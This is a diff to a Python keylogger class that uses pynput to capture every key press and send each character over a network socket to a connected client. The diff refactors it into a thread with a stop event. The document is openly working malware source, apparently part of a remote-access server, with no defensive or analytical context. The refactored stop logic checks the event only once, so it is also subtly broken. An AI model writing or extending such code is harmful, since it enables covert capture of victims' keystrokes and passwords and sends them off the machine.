@@ -1,22 +1,23 @@
 from pynput import keyboard
+import threading
 
-class Keylogger:
+class Keylogger(threading.Thread):
     def __init__(self, client_socket):
+        threading.Thread.__init__(self)
         self.conn = client_socket
         self.listener = None
+        self._stop_event = threading.Event()
 
-    def start(self):
-        try:
-            # Create a keyboard listener
-            self.listener = keyboard.Listener(on_press=self.log)
+    def run(self):
+        self.listener = keyboard.Listener(on_press=self.log)
+        self.listener.start()
+        print("Server: keylogger started")
 
-            # Start the keyboard listener in a separate thread
-            self.listener.start()
+        if self._stop_event.is_set():
+            self.listener.stop()
 
-            # Wait for user input to stop the keylogger
-            self.listener.join()
-        except Exception as e:
-            print(f"Error: {e}")
+    def stop(self):
+        self._stop_event.set()
 
     def log(self, key):
         try:
@@ -25,12 +26,4 @@ class Keylogger:
                 self.conn.send(str(key.char).encode())
         except Exception as e:
             print(f"Error while logging: {e}")
-
-    def stop(self):
-        try:
-            if self.listener:
-                # Stop the keyboard listener
-                self.listener.stop()
-                self.listener.join()
-        except Exception as e:
-            print(f"Error while stopping: {e}")
+            return False
